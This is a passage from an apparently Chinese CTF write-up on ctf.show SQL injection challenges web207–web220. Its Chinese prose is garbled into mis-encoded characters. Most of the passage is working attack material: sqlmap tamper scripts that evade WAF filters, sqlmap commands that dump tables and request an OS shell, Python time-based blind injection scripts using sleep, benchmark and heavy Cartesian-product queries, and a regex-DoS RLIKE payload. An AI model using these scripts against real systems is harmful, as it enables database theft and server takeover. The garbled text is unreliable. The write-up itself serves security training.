33 quote = False 34 # ç”¨äºè·Ÿè¸ªæ˜¯å¦åœ¨åŒå¼•å·å†… 35 doublequote = False 36 # ç”¨äºè·Ÿè¸ªæ˜¯å¦é‡åˆ°ç¬¬ä¸€ä¸ªç©ºæ ¼ 37 firstspace = False 38 39 for i in range(len(payload)): 40 if not firstspace: 41 if payload[i].isspace(): 42 firstspace = True 43 retVal += chr(0x0a) 44 continue 45 46 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 47 # å–åquoteçš„å€¼ 48 quote = not quote 49 50 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 51 # å–ådoublequoteçš„å€¼ 52 doublequote = not doublequote 53 54 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 55 retVal += chr(0x0a) 56 continue 57 58 retVal += payload[i] 59 60 return retVal å…¶å®è¿™æ®µä»£ç çš„ç›®çš„å°±æ˜¯å°†payloadä¸­çš„ç©ºæ ¼æ›¿æ¢æˆæ¢è¡Œç¬¦\nå…¶å®ç›´æ¥ç”¨sqlmapè‡ªå¸¦çš„sapce2commentæ¨¡æ¿\nsqlmap -u \u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump web208 åŒä¸Šä¸€é¢˜\nsqlmap -u \u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump web209 è¿™é¢˜æ–°å¢äº†ç‚¹waf\næŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\r//TODO æœªå®Œå·¥\rreturn preg_match(\u0026#39;/ |\\*|\\=/\u0026#39;, $str);\r} Y4tackerå¤§ä½¬çš„tamper\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6from lib.core.compat import xrange 7from lib.core.enums import PRIORITY 8 9__priority__ = PRIORITY.LOW 10 11 12def tamper(payload, **kwargs): 13 payload = space2comment(payload) 14 return payload 15 16 17def space2comment(payload): 18 retVal = payload 19 if payload: 20 retVal = \u0026#34;\u0026#34; 21 quote, doublequote, firstspace = False, False, False 22 23 for i in xrange(len(payload)): 24 if not firstspace: 25 if payload[i].isspace(): 26 firstspace = True 27 retVal += chr(0x0a) 28 continue 29 30 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 31 quote = not quote 32 33 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 34 doublequote = not doublequote 35 36 elif payload[i] == \u0026#34;*\u0026#34;: 37 retVal += chr(0x31) 38 continue 39 40 elif payload[i] == \u0026#34;=\u0026#34;: 41 retVal += chr(0x0a)+\u0026#39;like\u0026#39;+chr(0x0a) 42 continue 43 44 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 45 retVal += chr(0x0a) 46 continue 47 48 retVal += payload[i] 49 50 return retVal å…¶å®ä¹Ÿä¸ç”¨å†™è¿™ä¹ˆå¤æ‚\nç›´æ¥è¿™æ ·ä¹Ÿokçš„\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4 5__priority__ = PRIORITY.NORMAL 6 7def dependencies(): 8 pass 9 10 11def tamper(payload, **kwargs): 12 return payload.replace(\u0026#34;=\u0026#34;, \u0026#34; like \u0026#34;).replace(\u0026#34; \u0026#34;, chr(0x09)) payload:\npython sqlmap.py -u \u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump web210 æŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\rè¿™é¢˜ä¼šå¯¹æŸ¥è¯¢çš„å­—ç¬¦è¿›è¡Œä¸¤æ¬¡çš„base64è§£å¯†å’Œä¸¤æ¬¡çš„åè½¬\né‚£æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹tamperï¼Œä½¿ä¼ å…¥çš„payloadè¿›è¡Œä¸¤æ¬¡base64åŠ å¯†å³å¯\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13 rev1 = payload[::-1].encode() 14 encode1 = base64.b64encode(rev1).decode() 15 rev2 = encode1[::-1].encode() 16 encode2 = base64.b64encode(rev2).decode() 17 return encode2 payload:\npython sqlmap.py -u \u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump web211 æŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} å¢åŠ äº†ç©ºæ ¼waf\né—®é¢˜ä¸å¤§\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13\t14 payload0 = payload.replace(\u0026#34; \u0026#34;, chr(0x09)) 15 rev1 = payload0[::-1].encode() 16 encode1 = base64.b64encode(rev1).decode() 17 rev2 = encode1[::-1].encode() 18 encode2 = base64.b64encode(rev2).decode() 19 return encode2 payload\npython sqlmap.py -u \u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump web212 1æŸ¥è¯¢è¯­å¥ 2 3//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯† 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} wafå¢åŠ äº†*\nä½†æ˜¯ä¸å½±å“ä¸Šä¸€é¢˜çš„tamper\npython sqlmap.py -u \u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump web213 1æŸ¥è¯¢è¯­å¥ 2 3//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯† 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} æ ¹æ®æç¤ºï¼Œç”¨\u0026ndash;os-shellæ‹¿åˆ°shellè¯»flag\nå…¶ä»–è·Ÿä¸Šé¢˜ä¸€æ ·\npayload:\npython sqlmap.py -u \u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;\u0026#34; --referer=ctf.show --safe-url=\u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 --os-shell æ—¶é—´ç›²æ³¨ web214 è¿™é“é¢˜æ²¡ç»™å‡ºæ³¨å…¥ç‚¹\nä¸»é¡µæ‰¾åˆ°select.jsä¸­ï¼Œæµ‹è¯•åå‘ç°ipä¸ºæ³¨å…¥ç‚¹\n1import requests 2 3url = \u0026#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# æŸ¥è¡¨å 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥åˆ—å 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # çˆ†å­—æ®µ 21 payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 28 r = requests.post(url, data=data, timeout=1) 29 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 30 tail = mid 31 except requests.exceptions.Timeout: 32 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 40 result += chr(head) 41 else: 42 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web215 ä¸Šé¢˜è„šæœ¬æ”¹ä¸€æ”¹\n1import requests 2 3url = \u0026#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# æŸ¥è¡¨å 17 payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥åˆ—å 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # çˆ†å­—æ®µ 21 # payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 28 r = requests.post(url, data=data, timeout=1) 29 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 30 tail = mid 31 except requests.exceptions.Timeout: 32 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 40 result += chr(head) 41 else: 42 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web216 æ„é€ é—­åˆå³å¯\n1import requests 2 3url = \u0026#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# æŸ¥è¡¨å 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥åˆ—å 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcc\u0026#39;\u0026#34; 20 # çˆ†å­—æ®µ 21 payload = \u0026#34;select flagaac from ctfshow_flagxcc\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;\u0026#39;\u0026#39;) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 28 r = requests.post(url, data=data, timeout=1) 29 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 30 tail = mid 31 except requests.exceptions.Timeout: 32 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 40 result += chr(head) 41 else: 42 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web217 è¿™é¢˜wafäº†sleep\nå¯ä»¥æ”¹ç”¨benchmark\nåœ¨ MySQL ä¸­ï¼Œbenchmarkå‡½æ•°ç”¨äºæµ‹è¯•è¡¨è¾¾å¼æ‰§è¡Œçš„æ€§èƒ½ã€‚å®ƒçš„è¯­æ³•æ˜¯benchmark(count,expr)ï¼Œå…¶ä¸­countæ˜¯è¦æ‰§è¡Œexprçš„æ¬¡æ•°ï¼Œexpræ˜¯è¦æµ‹è¯•çš„è¡¨è¾¾å¼ã€‚ ä¾‹å¦‚ï¼Œbenchmark(10000000,sha(1))è¡¨ç¤ºå°†sha(1)è¿™ä¸ªè¡¨è¾¾å¼æ‰§è¡Œ 10000000 æ¬¡ã€‚sha(1)æ˜¯è®¡ç®—å­—ç¬¦ä¸²'1'çš„ SHA - 1 å“ˆå¸Œå€¼ã€‚ 1import requests 2import time 3 4url = \u0026#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 # æŸ¥æ•°æ®åº“ 18 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 19 # æŸ¥åˆ—åå­— 20 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxccb\u0026#39; limit 1,1\u0026#34; 21 # æŸ¥æ•°æ® 22 payload = \u0026#34;select flagaabc from ctfshow_flagxccb\u0026#34; 23 data = { 24 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},benchmark(1000000,sha(1)),1)#\u0026#34;, 25 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 26 } 27 try: 28 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 29 r = requests.post(url, data=data, timeout=0.33) 30 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 31 time.sleep(1) 32 tail = mid 33 except requests.exceptions.Timeout: 34 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 35 time.sleep(1) 36 head = mid + 1 37 except Exception as e: 38 time.sleep(1) 39 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 40 break 41 42 if head != 32: 43 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 44 result += chr(head) 45 else: 46 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 47 break 48 49 print(\u0026#34;[*]Result : \u0026#34;+result) benchmarkçš„è®¾ç½®æ¯”è¾ƒè‹›åˆ»ï¼Œè¦å¤šè¯•è¯•\næœ€å¥½ä¸è¦è®¾ç½®å¤ªå¤§ï¼Œç¯å¢ƒä¼šå´©\nweb218 1æŸ¥è¯¢è¯­å¥ 2 3 where id = ($id); 4 5è¿”å›é€»è¾‘ 6 7 //å±è”½å±é™©åˆ†å­ 8 function waf($str){ 9 return preg_match(\u0026#39;/sleep|benchmark/i\u0026#39;,$str); 10 } 11 è¿™é¢˜sleepå’Œbenchmarkéƒ½è¢«banæ‰äº†\nå¯ä»¥è€ƒè™‘ç”¨ç¬›å¡å°”ç§¯ç›²æ³¨\nå‚è€ƒæ–‡ç« ï¼šSQLæ³¨å…¥ç»éªŒ-å¤§è´Ÿè·æ³¨å…¥-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘\n1import requests 2import time 3 4url = \u0026#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxc\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaac from ctfshow_flagxc\u0026#34; 21 data = { 22 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 23 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 24 } 25 try: 26 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 27 r = requests.post(url, data=data, timeout=0.15) 28 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 29 time.sleep(0.2) 30 tail = mid 31 except requests.exceptions.Timeout: 32 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 33 time.sleep(0.2) 34 head = mid + 1 35 except Exception as e: 36 time.sleep(0.2) 37 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 38 break 39 40 if head != 32: 41 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 42 result += chr(head) 43 else: 44 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 45 break 46 47 print(\u0026#34;[*]Result : \u0026#34;+result) 48 49# ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45} ä¹±ç çš„è¯ï¼Œå¤šè·‘å‡ æ¬¡å°±å¥½äº†\nå¦ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡æ­£åˆ™ DOS RLIKEæ³¨å…¥\nåˆ©ç”¨ SQL å¤šæ¬¡è®¡ç®—æ­£åˆ™æ¶ˆè€—è®¡ç®—èµ„æºäº§ç”Ÿå»¶æ—¶æ•ˆæœï¼Œä¸ benchmark åŸç†ç±»ä¼¼ï¼Œé€šè¿‡ rpad æˆ– repeat æ„é€ é•¿å­—ç¬¦ä¸²ï¼Œä»¥è®¡ç®—é‡å¤§çš„ patternã€‚\ndebug=1\u0026amp;ip=repeat(rpad(\u0026#39;a\u0026#39;, 999999, \u0026#39;a\u0026#39;),16) rlike concat(repeat(\u0026#39;(a.*)+\u0026#39;,14), \u0026#39;b\u0026#39;) web219 æŸ¥è¯¢è¯­å¥\rwhere id = ($id);\rè¿”å›é€»è¾‘\r//å±è”½å±é™©åˆ†å­\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike/i\u0026#39;,$str);\r} ç»§ç»­ä½¿ç”¨ç¬›å¡å°”ç§¯ç›²æ³¨å³å¯\n1import requests 2import time 3 4url = \u0026#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxca\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaabc from ctfshow_flagxca\u0026#34; 21 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 try: 27 # å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’ 28 r = requests.post(url, data=data, timeout=0.15) 29 # å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼ 30 time.sleep(0.2) 31 tail = mid 32 except requests.exceptions.Timeout: 33 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 34 time.sleep(0.2) 35 head = mid + 1 36 except Exception as e: 37 time.sleep(0.2) 38 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 39 break 40 41 if head != 32: 42 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 43 result += chr(head) 44 else: 45 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 46 break 47 48 print(\u0026#34;[*]Result : \u0026#34;+result) web220 æŸ¥è¯¢è¯­å¥\rwhere id = ($id);\rè¿”å›é€»è¾‘\r//å±è”½å±é™©åˆ†å­\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i\u0026#39;,$str);\r} 